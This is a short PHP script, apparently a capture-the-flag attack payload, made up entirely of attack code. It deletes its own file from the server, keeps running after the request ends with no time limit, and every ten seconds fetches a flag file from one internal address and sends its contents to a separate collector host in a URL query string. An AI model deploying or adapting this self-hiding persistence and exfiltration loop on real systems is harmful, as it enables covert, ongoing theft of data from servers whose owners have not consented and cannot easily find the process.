<?php
$flagUrl='http://172.16.80.144/flag.txt';
$host='http://172.16.80.1:8000';

unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);

while (True){
    $f=file_get_contents($flagUrl);
    file_get_contents($host.'/?f='.$f);
    sleep(10);
}
?>
